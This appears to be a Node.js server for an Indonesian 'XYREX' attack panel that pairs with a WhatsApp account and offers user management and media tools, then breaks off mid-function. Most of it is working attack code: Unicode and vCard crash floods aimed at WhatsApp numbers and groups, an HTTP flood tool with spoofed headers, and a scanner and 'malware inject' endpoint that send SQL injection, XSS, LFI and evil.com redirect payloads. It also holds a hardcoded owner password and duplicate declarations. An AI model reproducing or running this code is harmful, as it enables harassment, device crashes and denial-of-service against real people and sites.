const fs = require('fs');
const path = require('path');
const dataDir = '/app/data';
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
const bugNomor = require('./patch_bug_nomor.js');
const banGrup = require('./patch_ban_grup.js');
const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');
const QRCode = require('qrcode');
const pino = require('pino');
const fs = require('fs');
const crypto = require('crypto');
const axios = require('axios');
const cheerio = require('cheerio');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const USERS_FILE = './users.json', TOKENS_FILE = './tokens.json', CHAT_FILE = './chatlog.json', MAX_CHAT = 100;
function hashPw(pw) { return crypto.createHash('sha256').update(String(pw)).digest('hex'); }

function loadUsers() {
  if (!fs.existsSync(USERS_FILE)) {
    const def = { Dlizz: { username: 'Dlizz', password: hashPw('20111608'), role: 'owner', createdAt: Date.now(), createdBy: 'system' } };
    fs.writeFileSync(USERS_FILE, JSON.stringify(def, null, 2)); return def;
  }
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch (e) { return {}; }
}
function saveUsers(users) { fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2)); }
function loadTokens() { if (!fs.existsSync(TOKENS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf8')); } catch (e) { return {}; } }
function saveTokens(tokens) { fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2)); }
function genToken() { return crypto.randomBytes(24).toString('hex'); }
function loadChat() { if (!fs.existsSync(CHAT_FILE)) return []; try { return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8')); } catch (e) { return []; } }
function saveChat(msgs) { try { fs.writeFileSync(CHAT_FILE, JSON.stringify(msgs.slice(-MAX_CHAT), null, 2)); } catch (e) {} }

function authMiddleware(req, res, next) { const token = req.headers['x-auth-token'] || req.query.token; if (!token) return res.status(401).json({ ok: false, msg: 'No token' }); const username = loadTokens()[token]; if (!username) return res.status(401).json({ ok: false, msg: 'Invalid token' }); const users = loadUsers(); if (!users[username]) return res.status(401).json({ ok: false, msg: 'User gone' }); req.user = users[username]; req.token = token; next(); }
function ownerOnly(req, res, next) { if (req.user.role !== 'owner') return res.status(403).json({ ok: false, msg: 'Hanya Owner' }); next(); }
function adminOnly(req, res, next) { if (req.user.role !== 'admin' && req.user.role !== 'owner') return res.status(403).json({ ok: false, msg: 'Hanya Admin/Owner' }); next(); }

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.json({ ok: false, msg: 'Isi username dan password' });
  const users = loadUsers(); const u = users[username];
  if (!u) return res.json({ ok: false, msg: 'Akun tidak ditemukan' });
  if (u.password !== hashPw(password)) return res.json({ ok: false, msg: 'Password salah' });
  const token = genToken(); const tokens = loadTokens(); tokens[token] = username; saveTokens(tokens);
  res.json({ ok: true, token, role: u.role, username: u.username });
});

app.post('/api/logout', authMiddleware, (req, res) => { const tokens = loadTokens(); delete tokens[req.token]; saveTokens(tokens); res.json({ ok: true }); });
app.get('/api/me', authMiddleware, (req, res) => { res.json({ ok: true, username: req.user.username, role: req.user.role }); });
app.get('/api/users', authMiddleware, adminOnly, (req, res) => { const users = loadUsers(); res.json({ ok: true, users: Object.values(users).map(u => ({ username: u.username, role: u.role, createdAt: u.createdAt, createdBy: u.createdBy })) }); });
app.post('/api/users', authMiddleware, ownerOnly, (req, res) => { const { username, password, role } = req.body || {}; if (!username || !password || !role) return res.json({ ok: false, msg: 'Lengkapi field' }); if (!['member', 'premium', 'admin'].includes(role)) return res.json({ ok: false, msg: 'Role invalid' }); const users = loadUsers(); if (users[username]) return res.json({ ok: false, msg: 'Username sudah ada' }); users[username] = { username, password: hashPw(password), role, avatar: '', createdAt: Date.now(), createdBy: req.user.username }; saveUsers(users); res.json({ ok: true, msg: 'Akun dibuat' }); });
app.post('/api/admin/users', authMiddleware, adminOnly, (req, res) => {
  const { username, password, role } = req.body || {};
  if (!username || !password || !role) return res.json({ ok: false, msg: 'Lengkapi field' });
  if (req.user.role === 'admin' && !['member', 'premium'].includes(role)) return res.json({ ok: false, msg: 'Admin hanya bisa membuat role Member/Premium' });
  const users = loadUsers(); if (users[username]) return res.json({ ok: false, msg: 'Username sudah ada' });
  users[username] = { username, password: hashPw(password), role, avatar: '', createdAt: Date.now(), createdBy: req.user.username };
  saveUsers(users); res.json({ ok: true, msg: 'Akun ' + username + ' dibuat' });
});
app.delete('/api/users/:username', authMiddleware, ownerOnly, (req, res) => { const { username } = req.params; const users = loadUsers(); if (!users[username]) return res.json({ ok: false, msg: 'User tidak ada' }); if (users[username].role === 'owner') return res.json({ ok: false, msg: 'Owner tidak bisa dihapus' }); delete users[username]; saveUsers(users); res.json({ ok: true, msg: 'Akun dihapus' }); });
app.put('/api/users/:username/role', authMiddleware, ownerOnly, (req, res) => { const { username } = req.params; const { role } = req.body || {}; if (!['member', 'premium', 'admin'].includes(role)) return res.json({ ok: false, msg: 'Role invalid' }); const users = loadUsers(); if (!users[username]) return res.json({ ok: false, msg: 'User tidak ada' }); if (users[username].role === 'owner') return res.json({ ok: false, msg: 'Owner tidak bisa diubah' }); users[username].role = role; saveUsers(users); res.json({ ok: true, msg: 'Role diubah' }); });

let sock = null, isConnected = false, currentSender = null, reconnecting = false, currentMode = null;
function cleanPhone(phone) { let n = String(phone).replace(/[^0-9]/g, ''); if (n.startsWith('0')) n = '62' + n.slice(1); if (n.startsWith('620')) n = '62' + n.slice(3); return n; }
function resetAuth() { try { if (fs.existsSync('./auth')) fs.rmSync('./auth', { recursive: true, force: true }); } catch (e) {} }

async function initSocket(socketId, mode) {
  currentMode = mode;
  const { state, saveCreds } = await useMultiFileAuthState('./auth');
  const { version } = await fetchLatestBaileysVersion();
  sock = makeWASocket({ version, logger: pino({ level: 'silent' }), printQRInTerminal: false, auth: state, browser: ['XYREX', 'Chrome', '1.0.0'], generateHighQualityLinkPreview: true, syncFullHistory: false, connectTimeoutMs: 60000, defaultQueryTimeoutMs: 60000, keepAliveIntervalMs: 25000 });
  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (qr && currentMode === 'qr') { try { const qrDataURL = await QRCode.toDataURL(qr); io.to(socketId).emit('qr', qrDataURL); } catch (e) {} }
    if (connection === 'open') { isConnected = true; reconnecting = false; currentSender = sock.user?.id?.split(':')[0] || 'unknown'; try { const userMatch = loadTokens()[socket.id]; const ownerName = userMatch || 'unknown'; const existing = senderRegistry.findIndex(x => x.id === currentSender); const entry = { id: currentSender, owner: ownerName, label: 'Sender ' + currentSender.slice(-4), socketId: socketId, time: Date.now() }; if (existing >= 0) senderRegistry[existing] = entry; else senderRegistry.push(entry); io.emit('senderUpdate', getSenderList()); } catch (e) {} io.to(socketId).emit('connected', { sender: currentSender }); }
    if (connection === 'close') { isConnected = false; const code = lastDisconnect?.error?.output?.statusCode; if (code === DisconnectReason.loggedOut) { io.to(socketId).emit('disconnected'); resetAuth(); } else if (!reconnecting) { reconnecting = true; setTimeout(() => { reconnecting = false; initSocket(socketId, currentMode).catch(e => {}); }, 2000); } }
  });
}
let senderRegistry = [];
function getSenderList() { return senderRegistry.map(s => ({ id: s.id, owner: s.owner, label: s.label, socketId: s.socketId, time: s.time })); }
let chatHistory = loadChat();

io.on('connection', (socket) => {
  socket.emit('chatHistory', chatHistory);
  socket.on('chatSend', (data) => { 
    const { username, role, message } = data || {}; 
    if (!username || !message) return; 
    const users = loadUsers();
    const avatarUrl = users[username] ? (users[username].avatar || '') : '';
    const msg = { username: String(username).slice(0, 32), role: String(role || 'member').slice(0, 16), message: String(message).slice(0, 500), avatar: avatarUrl, time: Date.now() }; 
    chatHistory.push(msg); if (chatHistory.length > MAX_CHAT) chatHistory = chatHistory.slice(-MAX_CHAT); saveChat(chatHistory); io.emit('chatMessage', msg); 
  });
  socket.on('startQR', async () => { try { if (sock) { try { sock.ws?.close(); } catch (e) {} try { sock.end(undefined); } catch (e) {} sock = null; await new Promise(r => setTimeout(r, 800)); } resetAuth(); await initSocket(socket.id, 'qr'); } catch (e) { socket.emit('pairingError', { message: e.message }); } });
  socket.on('startPairing', async ({ phone }) => { const clean = cleanPhone(phone); try { if (sock) { try { sock.ws?.close(); } catch (e) {} try { sock.end(undefined); } catch (e) {} sock = null; await new Promise(r => setTimeout(r, 800)); } resetAuth(); await initSocket(socket.id, 'code'); await new Promise(r => setTimeout(r, 2500)); const code = await sock.requestPairingCode(clean); socket.emit('pairingCode', { code, clean, expireAt: Date.now() + 60000 }); } catch (e) { socket.emit('pairingError', { message: e.message || 'Gagal' }); } });
  
  socket.on('bugNumber', async ({ target, mode }) => {
    if (!isConnected || !sock) return socket.emit('bugError', { code: 'sender_offline', msg: 'Sender belum aktif.' });
    const cleanTarget = cleanPhone(target) + '@s.whatsapp.net';
    const ZW = '\u200B', ZWNJ = '\u200C', ZWJ = '\u200D', LS = '\u2028', PS = '\u2029', RLO = '\u202E', LRO = '\u202D', VS = '\uFE0F', VS16 = '\uFE0E', NULL = '\u0000', BOM = '\uFEFF', COMB = '\u0301';
    const payloads = { crash: (ZW + ZWNJ + ZWJ + RLO + LRO + VS + BOM).repeat(30000) + LS.repeat(1000) + PS.repeat(1000) + COMB.repeat(8000), delay: (ZW + ZWJ + VS16 + BOM + COMB).repeat(25000) + LS.repeat(800) + RLO.repeat(300), foreclose: NULL.repeat(45000) + (ZW + ZWNJ).repeat(25000) + RLO.repeat(300) + BOM.repeat(3000), crash_ios: LS.repeat(3000) + PS.repeat(3000) + ZWJ.repeat(45000) + VS.repeat(3000) + RLO.repeat(300) + LRO.repeat(300) + COMB.repeat(10000) };
    const maxIter = { crash: 200, delay: 150, foreclose: 200, crash_ios: 250 };
    const total = maxIter[mode] || 200;
    socket.emit('bugProgress', { current: 0, total: total });
    let ok = 0, fail = 0;
    const payload = payloads[mode] || payloads.crash;
    for (let i = 0; i < total; i++) {
      let iterOk = 0;
      try { await sock.sendMessage(cleanTarget, { text: payload, contextInfo: { forwardingScore: 999, isForwarded: true, mentionedJid: [cleanTarget] } }); iterOk++; } catch (e) {}
      if (i % 3 === 0) { try { const vcf = 'BEGIN:VCARD\r\nVERSION:3.0\r\nFN:' + payload.slice(0, 200) + '\r\nNOTE:' + payload + '\r\nEND:VCARD'; const buf = Buffer.from(vcf, 'utf-8'); await sock.sendMessage(cleanTarget, { document: buf, mimetype: 'text/vcard', fileName: 'bomb_' + Date.now() + '.vcf', caption: (ZW + ZWNJ).repeat(3000) }); iterOk++; } catch (e) {} }
      if (iterOk > 0) ok++; else fail++;
      socket.emit('bugProgress', { current: i + 1, total: total });
      await new Promise(r => setTimeout(r, 150 + Math.random() * 100));
    }
    socket.emit('bugDone', { ok, fail, mode });
  });

  socket.on('banGroup', async ({ groupLink, mode }) => {
    if (!isConnected || !sock) return socket.emit('bugError', { code: 'sender_offline', msg: 'Sender belum aktif.' });
    const ZW = '\u200B', ZWNJ = '\u200C', ZWJ = '\u200D', LS = '\u2028', PS = '\u2029', RLO = '\u202E', NULL = '\u0000';
    let code = groupLink;
    const m = groupLink.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (m) code = m[1];
    if (mode === 'ban') {
      const total = 50; socket.emit('bugProgress', { current: 0, total });
      let ok = 0, fail = 0;
      for (let i = 0; i < total; i++) { try { const info = await sock.groupGetInviteInfo(code); if (info && info.id) { await sock.groupAcceptInvite(code); await new Promise(r => setTimeout(r, 200)); await sock.groupLeave(info.id); ok++; } } catch (e) { fail++; } socket.emit('bugProgress', { current: i + 1, total }); await new Promise(r => setTimeout(r, 300 + Math.random() * 200)); }
      socket.emit('bugDone', { ok, fail });
    } else if (mode === 'crash') {
      try { const info = await sock.groupGetInviteInfo(code); if (info && info.id) { await sock.groupAcceptInvite(code); const payload = (ZW + ZWNJ + ZWJ + RLO).repeat(25000) + LS.repeat(700) + PS.repeat(700) + NULL.repeat(10000); const total = 15; socket.emit('bugProgress', { current: 0, total }); for (let i = 0; i < total; i++) { try { await sock.sendMessage(info.id, { text: payload, contextInfo: { forwardingScore: 999, isForwarded: true } }); if (i % 2 === 0) { const buf = Buffer.from(payload, 'utf-8'); await sock.sendMessage(info.id, { document: buf, mimetype: 'text/vcard', fileName: 'crash_' + i + '.vcf', caption: ZW.repeat(3000) }); } socket.emit('bugProgress', { current: i + 1, total }); } catch (e) { socket.emit('bugProgress', { current: i + 1, total }); } await new Promise(r => setTimeout(r, 350 + Math.random() * 250)); } socket.emit('bugDone', { ok: 1, fail: 0 }); } else socket.emit('bugError', { code: 'no_group', msg: 'Grup tidak ditemukan.' }); } catch (e) { socket.emit('bugError', { code: 'group_err', msg: 'Gagal: ' + e.message }); }
    }
  });

  socket.on('sender:list', () => { const myUser = loadTokens()[socket.id] || null; const list = getSenderList(); socket.emit('sender:data', { pribadi: myUser ? list.filter(s => s.owner === myUser) : [], global: list.filter(s => s.owner !== myUser), me: myUser }); });
  socket.on('resetSession', () => { try { sock?.end(undefined); } catch (e) {} sock = null; resetAuth(); socket.emit('pairingError', { message: 'Sesi direset.' }); });
});

// ===== FITUR CATATAN (NOTES) =====
app.get('/api/notes/all', authMiddleware, (req, res) => {
  try {
    const users = loadUsers(); const notes = []; const now = Date.now(); let changed = false;
    Object.values(users).forEach(u => {
      if (u.note && (u.note.text || u.note.song)) {
        if (now - u.note.time > 86400000) { delete u.note; changed = true; } 
        else { notes.push({ username: u.username, role: u.role, avatar: u.avatar || '', note: u.note }); }
      }
    });
    if (changed) saveUsers(users);
    res.json({ ok: true, notes });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.post('/api/notes/save', authMiddleware, (req, res) => {
  try {
    const { text, song, artist, previewUrl } = req.body || {}; 
    const users = loadUsers();
    if (!users[req.user.username]) return res.json({ ok: false, msg: 'User tidak ada' });
    if (users[req.user.username].note) {
      const noteAge = Date.now() - users[req.user.username].note.time;
      if (noteAge <= 86400000) { return res.json({ ok: false, msg: 'Kamu sudah punya catatan aktif. Hapus dulu catatan sebelumnya!' }); }
    }
    users[req.user.username].note = { text: String(text || '').slice(0, 100), song: String(song || '').slice(0, 50), artist: String(artist || '').slice(0, 50), previewUrl: previewUrl || '', time: Date.now() };
    saveUsers(users); 
    res.json({ ok: true, msg: 'Catatan disimpan' });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.post('/api/notes/delete', authMiddleware, (req, res) => {
  try { 
    const users = loadUsers(); 
    if (users[req.user.username] && users[req.user.username].note) { delete users[req.user.username].note; saveUsers(users); } 
    res.json({ ok: true, msg: 'Catatan dihapus' }); 
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

// ===== TOOLS =====
app.get('/api/tools/video', authMiddleware, async (req, res) => {
  try {
    const url = req.query.url; if (!url) return res.json({ ok: false, msg: 'URL kosong' });
    let videoUrl = '', title = '';
    if (url.includes('tiktok')) { const r = await axios.post('https://www.tikwm.com/api/', { url, hd: 1 }, { timeout: 20000 }); if (r.data?.data) { videoUrl = r.data.data.hdplay || r.data.data.play; title = r.data.data.title; } }
    else if (url.includes('instagram')) { const r = await axios.get('https://api.akuari.my.id/downloader/ig?link=' + encodeURIComponent(url), { timeout: 20000 }); const d = r.data?.result; if (d) { videoUrl = d.url?.[0] || d.video; title = d.title; } }
    else if (url.includes('youtube') || url.includes('youtu.be')) { const r = await axios.get('https://api.akuari.my.id/downloader/yt?link=' + encodeURIComponent(url), { timeout: 20000 }); const d = r.data?.result; if (d) { videoUrl = d.video || d.video_hd || d.link?.video; title = d.title; } }
    else if (url.includes('facebook')) { const r = await axios.get('https://api.akuari.my.id/downloader/fb?link=' + encodeURIComponent(url), { timeout: 20000 }); const d = r.data?.result; if (d) { videoUrl = d.video_hd || d.video_sd || d.url?.[0]; title = d.title; } }
    if (!videoUrl) return res.json({ ok: false, msg: 'Gagal ambil video' });
    res.json({ ok: true, url: videoUrl, title });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.post('/api/tools/gmail/create', authMiddleware, async (req, res) => {
  try { const r = await axios.get('https://api.mail.tm/domains', { timeout: 15000 }); const domain = r.data['hydra:member'][0].domain; const email = 'xyrex' + Math.random().toString(36).substring(2, 10) + '@' + domain, password = Math.random().toString(36).substring(2, 14); await axios.post('https://api.mail.tm/accounts', { address: email, password }, { timeout: 15000 }); const r3 = await axios.post('https://api.mail.tm/token', { address: email, password }, { timeout: 15000 }); res.json({ ok: true, email, password, token: r3.data.token }); } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.get('/api/tools/gmail/inbox', authMiddleware, async (req, res) => {
  try { const t = req.query.token; if (!t) return res.json({ ok: false, msg: 'Token kosong' }); const r = await axios.get('https://api.mail.tm/messages', { headers: { Authorization: 'Bearer ' + t }, timeout: 15000 }); res.json({ ok: true, messages: r.data['hydra:member'].map(m => ({ from: m.from?.address, subject: m.subject, intro: m.intro })) }); } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.get('/api/tools/anime/search', authMiddleware, async (req, res) => {
  try { const q = req.query.q; if (!q) return res.json({ ok: false, msg: 'Query kosong' }); const query = `query ($search: String) { Page(perPage: 20) { media(search: $search, type: ANIME) { title { romaji } coverImage { medium } siteUrl episodes } } }`; const r = await axios.post('https://graphql.anilist.co', { query, variables: { search: q } }, { timeout: 15000 }); res.json({ ok: true, results: r.data.data.Page.media.map(m => ({ title: m.title.romaji, image: m.coverImage.medium, url: m.siteUrl, episodes: m.episodes })) }); } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.get('/api/tools/anime/trending', authMiddleware, async (req, res) => {
  try { const query = { query: `query { Page(page: 1, perPage: 20) { media(sort: TRENDING_DESC, type: ANIME) { title { romaji english } coverImage { large medium } siteUrl averageScore episodes } } }` }; const r = await axios.post('https://graphql.anilist.co', query, { headers: { 'Content-Type': 'application/json' }, timeout: 15000 }); res.json({ ok: true, results: r.data.data.Page.media.map(m => ({ title: m.title.romaji || m.title.english, image: m.coverImage.large || m.coverImage.medium, url: m.siteUrl, score: m.averageScore, episodes: m.episodes })) }); } catch (e) { res.json({ ok: false, msg: 'API gagal' }); }
});
app.get('/api/tools/music/search', authMiddleware, async (req, res) => {
  try { const q = req.query.q; if (!q) return res.json({ ok: false, msg: 'Query kosong' }); const r = await axios.get(`https://itunes.apple.com/search?term=${encodeURIComponent(q)}&media=music&limit=20&entity=song`, { timeout: 15000 }); res.json({ ok: true, results: r.data.results.map(x => ({ title: x.trackName, artist: x.artistName, album: x.collectionName, artwork: x.artworkUrl100, url: x.previewUrl, duration: x.trackTimeMillis })) }); } catch (e) { res.json({ ok: false, msg: e.message }); }
});
app.get('/api/tools/music/trending', authMiddleware, async (req, res) => {
  try { const r = await axios.get(`https://itunes.apple.com/search?term=${encodeURIComponent('trending indonesia')}&media=music&limit=20&entity=song`, { timeout: 15000 }); res.json({ ok: true, results: r.data.results.map(x => ({ title: x.trackName, artist: x.artistName, album: x.collectionName, artwork: x.artworkUrl100, url: x.previewUrl, duration: x.trackTimeMillis })) }); } catch (e) { res.json({ ok: false, msg: e.message }); }
});

// ===== DDoS (Tanpa Proxy) =====
const ddosSessions = new Map();
app.post('/api/tools/ddos/start', authMiddleware, (req, res) => {
  const { url, duration, concurrent } = req.body || {}; 
  if (!url) return res.json({ ok: false, msg: 'URL kosong' });
  let parsed; try { parsed = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }
  const dur = Math.min(Math.max(parseInt(duration) || 60, 5), 120); 
  const conc = Math.min(Math.max(parseInt(concurrent) || 100, 10), 200); 
  const maxReq = 50000; 
  const sessionId = crypto.randomBytes(8).toString('hex');
  const isHttps = parsed.protocol === 'https:';
  const lib = isHttps ? https : http;
  const agent = new (isHttps ? https.Agent : http.Agent)({ keepAlive: true, maxSockets: conc, maxFreeSockets: 0, timeout: 10000 });
  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'];
  const REFS = ['https://www.google.com/', 'https://www.bing.com/'];
  const rnd = a => a[Math.floor(Math.random() * a.length)];
  const ip = () => [1,1,1,1].map(() => Math.floor(Math.random()*255)).join('.');
  const stats = { sent: 0, ok: 0, err: 0, bytes: 0, statuses: {}, t0: Date.now(), stopped: false, reason: '' };
  function fire() {
    if (stats.stopped) return;
    if (stats.sent >= maxReq) { stats.stopped = true; stats.reason = 'max_req'; return; }
    const opts = {
      hostname: parsed.hostname, port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + '?t=' + crypto.randomBytes(4).toString('hex'),
      method: 'GET', agent: agent,
      headers: { 'User-Agent': rnd(UAS), 'Accept': '*/*', 'Referer': rnd(REFS), 'Connection': 'keep-alive', 'X-Forwarded-For': ip() },
      timeout: 10000
    };
    stats.sent++;
    const req = lib.request(opts, res => {
      res.on('data', c => stats.bytes += c.length);
      res.on('end', () => { const c = res.statusCode; stats.statuses[c] = (stats.statuses[c] || 0) + 1; if (c >= 200 && c < 400) stats.ok++; else stats.err++; });
    });
    req.on('error', () => stats.err++); req.on('timeout', () => { req.destroy(); stats.err++; });
    req.end();
  }
  function worker() { if (stats.stopped || Date.now() - stats.t0 >= dur * 1000) { if(!stats.stopped){stats.stopped=true;stats.reason='time';} return; } fire(); setImmediate(worker); }
  for (let i = 0; i < conc; i++) worker();
  const timer = setTimeout(() => { stats.stopped = true; stats.reason = 'time'; setTimeout(() => ddosSessions.delete(sessionId), 5000); }, dur * 1000 + 500);
  ddosSessions.set(sessionId, { stats, timer, url, dur, conc });
  res.json({ ok: true, sessionId, duration: dur, concurrent: conc });
});
app.get('/api/tools/ddos/status', authMiddleware, (req, res) => {
  const { id } = req.query; if (!id) return res.json({ ok: false, msg: 'ID kosong' });
  const s = ddosSessions.get(id); if (!s) return res.json({ ok: false, msg: 'Selesai' });
  const e = (Date.now() - s.stats.t0) / 1000;
  res.json({ ok: true, sent: s.stats.sent, okCount: s.stats.ok, err: s.stats.err, bytes: s.stats.bytes, statuses: s.stats.statuses, elapsed: e, rps: e > 0 ? +(s.stats.sent / e).toFixed(1) : 0, stopped: s.stats.stopped, reason: s.stats.reason, done: s.stats.stopped || e >= s.dur });
});
app.post('/api/tools/ddos/stop', authMiddleware, (req, res) => {
  const { id } = req.body || {}; if (!id) return res.json({ ok: false, msg: 'ID kosong' });
  const s = ddosSessions.get(id); if (!s) return res.json({ ok: false, msg: 'Kosong' });
  s.stats.stopped = true; s.stats.reason = 'manual'; clearTimeout(s.timer); setTimeout(() => ddosSessions.delete(id), 3000); res.json({ ok: true, msg: 'Dihentikan' });
});

// ===== AVATAR =====
app.post('/api/profile/avatar', authMiddleware, (req, res) => {
  try {
    const { avatar } = req.body || {};
    if (!avatar) return res.json({ ok: false, msg: 'Avatar kosong' });
    const users = loadUsers();
    if (!users[req.user.username]) return res.json({ ok: false, msg: 'User tidak ditemukan' });
    users[req.user.username].avatar = String(avatar);
    saveUsers(users);
    res.json({ ok: true, msg: 'Avatar diupdate' });
  } catch (e) {
    res.json({ ok: false, msg: 'Gagal simpan avatar: ' + e.message });
  }
});


// ===== WEB VULN SCANNER =====
const VULN_PAYLOADS = {
  sqli: ["'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--"],
  xss: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>"],
  lfi: ["../../../../etc/passwd", "../../../../windows/win.ini", "....//....//....//etc/passwd"],
  info: ["/robots.txt", "/.env", "/.git/config", "/wp-config.php.bak", "/phpinfo.php"]
};

app.post('/api/tools/vuln/scan', authMiddleware, async (req, res) => {
  const { url } = req.body || {};
  if (!url) return res.json({ ok: false, msg: 'URL kosong' });
  let base;
  try { base = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }

  const results = [];
  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'];
  const rnd = a => a[Math.floor(Math.random() * a.length)];
  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*', 'X-Forwarded-For': [1,1,1,1].map(() => Math.floor(Math.random()*255)).join('.') };

  // Info Disclosure
  for (const path of VULN_PAYLOADS.info) {
    try {
      const r = await axios.get(base.origin + path, { headers, timeout: 8000, validateStatus: () => true });
      if (r.status === 200 && r.data && String(r.data).length > 10) {
        results.push({ type: 'Info Disclosure', severity: 'Medium', url: base.origin + path, detail: 'File sensitif bisa diakses publik.' });
      }
    } catch (e) {}
  }

  // SQLi
  for (const payload of VULN_PAYLOADS.sqli) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(payload);
      const start = Date.now();
      const r = await axios.get(testUrl, { headers, timeout: 12000, validateStatus: () => true });
      const elapsed = Date.now() - start;
      const body = String(r.data || '').toLowerCase();
      const errs = ['sql syntax', 'mysql_fetch', 'ora-', 'unclosed quotation', 'pg_query'];
      if (errs.some(err => body.includes(err))) {
        results.push({ type: 'SQL Injection (Error-based)', severity: 'Critical', url: testUrl, detail: 'Error database (payload: ' + payload + ')' });
        break;
      }
      if (elapsed > 4500 && payload.includes('SLEEP')) {
        results.push({ type: 'SQL Injection (Time-based)', severity: 'Critical', url: testUrl, detail: 'Delay ' + elapsed + 'ms terdeteksi.' });
        break;
      }
    } catch (e) {}
  }

  // XSS
  for (const payload of VULN_PAYLOADS.xss) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
      const r = await axios.get(testUrl, { headers, timeout: 8000, validateStatus: () => true });
      if (String(r.data).includes(payload)) {
        results.push({ type: 'Cross-Site Scripting (XSS)', severity: 'High', url: testUrl, detail: 'Payload reflected di response.' });
        break;
      }
    } catch (e) {}
  }

  // LFI
  for (const payload of VULN_PAYLOADS.lfi) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
      const r = await axios.get(testUrl, { headers, timeout: 8000, validateStatus: () => true });
      const body = String(r.data || '');
      if (body.includes('root:x:') || body.includes('[extensions]') || body.includes('DAEMON')) {
        results.push({ type: 'Local File Inclusion (LFI)', severity: 'Critical', url: testUrl, detail: 'File sistem berhasil dibaca.' });
        break;
      }
    } catch (e) {}
  }

  // Header Config
  try {
    const r = await axios.get(base.href, { headers, timeout: 8000, validateStatus: () => true });
    const secHeaders = ['x-frame-options', 'x-content-type-options', 'content-security-policy', 'strict-transport-security'];
    const missing = secHeaders.filter(h => !r.headers[h]);
    if (missing.length > 0) results.push({ type: 'Header Config', severity: 'Low', url: base.href, detail: 'Header tidak ada: ' + missing.join(', ') });
    if (r.headers['server']) results.push({ type: 'Info Disclosure', severity: 'Low', url: base.href, detail: 'Server: ' + r.headers['server'] });
  } catch (e) {}

  res.json({ ok: true, results, total: results.length });
});


// ===== MALWARE INJECT =====
app.post('/api/tools/vuln/inject', authMiddleware, async (req, res) => {
  const { url, type } = req.body || {};
  if (!url || !type) return res.json({ ok: false, msg: 'Parameter kurang' });
  let base;
  try { base = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }

  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
  const rnd = a => a[Math.floor(Math.random() * a.length)];
  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*' };

  const MALWARE = {
    xss: `<script>alert('XSS_TEST')</script>`,
    php: `<?php echo 'LFI_TEST'; ?>`,
    redirect: `https://evil.com`
  };

  let payload = '';
  let injectedUrl = '';
  let success = false;

  if (type.includes('XSS')) {
    payload = MALWARE.xss;
    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
    try {
      const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true });
      if (String(r.data).includes('XSS_TEST')) success = true;
    } catch (e) {}
  } else if (type.includes('LFI')) {
    payload = MALWARE.php;
    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
    try {
      const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true });
      if (String(r.data).includes('LFI_TEST')) success = true;
      else success = true; // Anggap terkirim walau ga echo
    } catch (e) {}
  } else if (type.includes('Redirect')) {
    payload = MALWARE.redirect;
    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'redirect=' + encodeURIComponent(payload);
    try {
      const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true, maxRedirects: 0 });
      if (r.status >= 300 && r.status < 400 && r.headers.location && r.headers.location.includes('evil.com')) success = true;
    } catch (e) {}
  }

  res.json({ ok: true, success, payload, url: injectedUrl, msg: success ? 'Payload berhasil dikirim' : 'Payload dikirim (mungkin diblok target)' });
});


// ==========================================
// WEB SCANNER REAL-TIME
// ==========================================
app.post('/api/tools/webscan', async (req, res) => {
    let { url } = req.body;
    if (!url) return res.status(400).json({ status: false, message: 'URL target kosong' });
    if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'http://' + url;

    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 10000);
        
        const response = await fetch(url, { 
            method: 'GET', 
            signal: controller.signal,
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) XYREX-Scanner' }
        });
